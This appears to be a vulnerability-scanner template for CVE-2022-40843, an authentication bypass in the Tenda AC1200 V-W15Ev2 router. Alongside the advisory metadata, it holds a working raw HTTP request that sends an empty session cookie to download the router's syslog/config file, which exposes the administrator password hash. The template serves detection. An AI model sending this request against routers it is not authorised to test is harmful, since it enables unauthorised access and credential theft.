id: CVE-2022-40843

info:
  name: Tenda AC1200 V-W15Ev2 - Authentication Bypass
  author: gy741
  severity: critical
  description: |
    The Tenda AC1200 V-W15Ev2 router is affected by improper authorization/improper session management. The software does not perform or incorrectly perform an authorization check when a user attempts to access a resource or perform an action. This allows the router's login page to be bypassed. The improper validation of user sessions/authorization can lead to unauthenticated attackers having the ability to read the router's file, which contains the MD5 password of the Administrator's user account. This vulnerability exists within the local web and hosted remote management console.
  reference:
    - https://boschko.ca/tenda_ac1200_router
    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-40843
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:L
    cvss-score: 9.9
    cve-id: CVE-2022-40843
    cwe-id: CWE-287
  metadata:
    max-request: 1
  tags: cve,cve2022,tenda,auth-bypass,router,iot

requests:
  - raw:
      - |
        GET /goform/downloadSyslog/syslog.log HTTP/1.1
        Host: {{Hostname}}
        Cookie: W15Ev2_user=

    matchers-condition: and
    matchers:
      - type: regex
        regex:
          - '^0\d{3}$'

      - type: word
        part: body
        words:
          - "[system]"
          - "[error]"
          - "[wan1]"
        condition: or

      - type: word
        part: header
        words:
          - "Content-type: config/conf"

      - type: status
        status:
          - 200
